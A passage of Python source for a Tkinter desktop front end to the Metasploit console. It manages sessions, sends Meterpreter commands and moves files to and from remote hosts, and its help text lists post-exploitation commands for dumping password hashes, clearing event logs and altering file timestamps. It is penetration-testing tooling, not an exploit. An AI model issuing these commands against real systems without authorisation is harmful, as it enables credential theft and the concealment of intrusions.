hashdump         - Dump password hashes
clearev          - Clear event logs
timestomp <file> - Modify file timestamps
run <script>     - Run a meterpreter script
load <extension> - Load a meterpreter extension
help             - Show meterpreter help
"""
        }
        
        commands_text += commands_dict.get(category, "No commands available for this category.")
        
        self.commands_display.delete(1.0, tk.END)
        self.commands_display.insert(1.0, commands_text)
    
    def show_full_help(self):
        """Show full help in console."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        self.console.send_command("help")
        self.console_output_callback("Showing full help...\n", "output")
    
    def show_version(self):
        """Show version in console."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        self.console.send_command("version")
        self.console_output_callback("Showing version...\n", "output")
    
    # Session manager methods
    def refresh_sessions(self):
        """Refresh session list."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        self.console.send_command("sessions -l")
        self.console_output_callback("Refreshing sessions...\n", "output")
    
    def interact_session(self):
        """Interact with selected session."""
        selection = self.session_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a session.")
            return
        
        item = self.session_tree.item(selection[0])
        session_id = item['values'][0]
        
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        command = f"sessions -i {session_id}"
        self.console.send_command(command)
        self.console_output_callback(f"Interacting with session {session_id}\n", "success")
    
    def kill_session(self):
        """Kill selected session."""
        selection = self.session_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a session.")
            return
        
        item = self.session_tree.item(selection[0])
        session_id = item['values'][0]
        
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        command = f"sessions -k {session_id}"
        self.console.send_command(command)
        self.console_output_callback(f"Killing session {session_id}\n", "warning")
    
    def upgrade_session(self):
        """Upgrade shell session to meterpreter."""
        selection = self.session_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a session.")
            return
        
        item = self.session_tree.item(selection[0])
        session_id = item['values'][0]
        
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        command = f"sessions -u {session_id}"
        self.console.send_command(command)
        self.console_output_callback(f"Upgrading session {session_id} to meterpreter\n", "success")
    
    # Meterpreter management methods
    def refresh_meterpreter_sessions(self):
        """Refresh meterpreter session list."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        # Clear existing items
        for item in self.meterpreter_tree.get_children():
            self.meterpreter_tree.delete(item)
        
        # Send command to list sessions
        self.console.send_command("sessions -l")
        self.meterpreter_output_callback("Refreshing meterpreter sessions...\n", "output")
        
        # Parse sessions output (this would need to be enhanced to parse actual output)
        # For now, we'll rely on the console output callback to show results
    
    def interact_meterpreter(self, event=None):
        """Interact with selected meterpreter session."""
        selection = self.meterpreter_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a meterpreter session.")
            return
        
        item = self.meterpreter_tree.item(selection[0])
        session_id = item['values'][0]
        
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        command = f"sessions -i {session_id}"
        self.console.send_command(command)
        self.meterpreter_output_callback(f"Interacting with meterpreter session {session_id}\n", "success")
    
    def send_meterpreter_command(self, event=None):
        """Send command to active meterpreter session."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        command = self.meterpreter_command_entry.get().strip()
        if not command:
            return
        
        self.console.send_command(command)
        self.meterpreter_output_callback(f"meterpreter > {command}\n", "output")
        self.meterpreter_command_entry.delete(0, tk.END)
    
    def quick_meterpreter_command(self, command):
        """Send quick meterpreter command."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        self.meterpreter_command_entry.delete(0, tk.END)
        self.meterpreter_command_entry.insert(0, command)
        self.send_meterpreter_command()
    
    def browse_meterpreter_local_file(self):
        """Browse for local file to upload."""
        filename = filedialog.askopenfilename(
            title="Select file to upload",
            initialdir=os.path.expanduser("~")
        )
        if filename:
            self.meterpreter_local_file.delete(0, tk.END)
            self.meterpreter_local_file.insert(0, filename)
    
    def meterpreter_upload_file(self):
        """Upload file to remote system."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        local_file = self.meterpreter_local_file.get().strip()
        remote_path = self.meterpreter_remote_path.get().strip()
        
        if not local_file:
            messagebox.showwarning("Warning", "Please specify a local file.")
            return
        
        if not os.path.exists(local_file):
            messagebox.showerror("Error", f"Local file does not exist: {local_file}")
            return
        
        if not remote_path:
            messagebox.showwarning("Warning", "Please specify a remote path.")
            return
        
        command = f"upload {local_file} {remote_path}"
        self.console.send_command(command)
        self.meterpreter_output_callback(f"Uploading {local_file} to {remote_path}...\n", "output")
    
    def meterpreter_download_file(self):
        """Download file from remote system."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        remote_path = self.meterpreter_remote_path.get().strip()
        local_file = self.meterpreter_local_file.get().strip()
        
        if not remote_path:
            messagebox.showwarning("Warning", "Please specify a remote file path.")
            return
        
        if not local_file:
            # Use remote filename if local not specified
            local_file = os.path.basename(remote_path)
        
        # Ask for save location if not specified
        if not local_file or not os.path.dirname(local_file):
            save_path = filedialog.asksaveasfilename(
                title="Save downloaded file as",
                initialdir=os.path.expanduser("~"),
                initialfile=os.path.basename(remote_path)
            )
            if not save_path:
                return
            local_file = save_path
        
        command = f"download {remote_path} {local_file}"
        self.console.send_command(command)
        self.meterpreter_output_callback(f"Downloading {remote_path} to {local_file}...\n", "output")
    
    def meterpreter_output_callback(self, text, tag="output"):
        """Callback for meterpreter output."""
        def _update():
            self.meterpreter_output.insert(tk.END, text, tag)
            self.meterpreter_output.see(tk.END)
        
        self.root.after(0, _update)
    
    # System tray methods
    def setup_system_tray(self):
        """Setup system tray icon."""
        if not HAS_PYSTRAY:
            return
        
        try:
            icon_path = self._find_icon_path()
            
            tray_image = None
            if icon_path:
                try:
                    tray_image = Image.open(icon_path)
                    tray_image = tray_image.resize((64, 64), Image.Resampling.LANCZOS)
                except:
                    pass
            
            if not tray_image:
                tray_image = Image.new('RGB', (64, 64), color='#0066CC')
            
            menu = pystray.Menu(
                pystray.MenuItem('Show Window', self.show_window),
                pystray.MenuItem('Quit', self.quit_application)
            )
            
            self.tray_icon = pystray.Icon("YaP Metasploit GUI", tray_image, 
                                         "YaP Metasploit GUI", menu)
            
            self.tray_thread = threading.Thread(target=self.tray_icon.run, daemon=True)
            self.tray_thread.start()
        except Exception as e:
            print(f"Warning: Could not setup system tray: {e}")
            self.tray_icon = None
    
    def show_window(self, icon=None, item=None):
        """Show the main window."""
        self.root.deiconify()
        self.root.lift()
        self.root.focus_force()
        self.hidden_to_tray = False
    
    def hide_to_tray(self):
        """Hide window to system tray."""
        if self.tray_icon:
            self.root.withdraw()
            self.hidden_to_tray = True
    
    def quit_application(self, icon=None, item=None):
        """Quit the application."""
        if self.console:
            self.console.stop()
        if self.tray_icon:
            self.tray_icon.stop()
        self.root.quit()
        self.root.destroy()
    
    def on_closing(self):
        """Handle window close event."""
        if HAS_PYSTRAY and self.tray_icon:
            self.hide_to_tray()
        else:
            if self.console:
                self.console.stop()
            self.root.destroy()

def main():
    """Main entry point."""
    root = tk.Tk()
    app = MetasploitGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
